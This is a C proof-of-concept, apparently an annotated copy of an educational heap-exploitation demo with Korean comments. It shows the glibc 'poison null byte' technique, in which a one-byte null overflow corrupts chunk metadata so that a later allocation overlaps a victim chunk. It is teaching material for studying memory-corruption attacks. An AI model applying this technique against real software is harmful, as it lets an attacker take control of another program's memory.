#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>


int main()
{
	printf("Welcome to poison null byte 2.0!\n");
	printf("Tested in Ubuntu 14.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;

	printf("We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	printf("a: %p\n", a);
	int real_a_size = malloc_usable_size(a); // 0x108
	printf("real_a_size : %#x\n", real_a_size);

	b = (uint8_t*) malloc(0x200);
	printf("b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	printf("c: %p\n", c);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x1f0) = 0x200;
	free(b);
	/* 원래 C's prev_size는 b+0x200 위치지만,
	off-by-one overflow로 LSB가 0x00이 되면 
	nextchunk's prev_size를 참조하는 위치도 그 만큼 가까워지므로
	free하기 전 알맞은 위치에 prev_size를 미리 설정해둔다.*/

	printf("b.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	printf("b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);


	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	b1 = malloc(0x100);  // b에 대한 unlink가 일어난다.
	/* size 말고는 정상적으로 linked-list에 들어가 있는 chunk이기 때문에 
	unlink의 다른 check는 고려하지 않아도 된다.*/

	printf("b1: %p\n",b1);
	printf("Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %#lx\n",*(((uint64_t*)c)-4));
		
	printf("We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
	b2 = malloc(0x80);
	printf("b2: %p\n",b2);

	memset(b2,'B',0x80);
	printf("Current b2 content:\n%s\n",b2);

	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1); // 안하면, Error : corrupted double-linked list
	free(c);
	
	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	printf("d: %p\n",d);
	
	printf("Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	printf("New b2 content:\n%s\n",b2);

	printf("Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
		"for the clear explanation of this technique.\n");
}
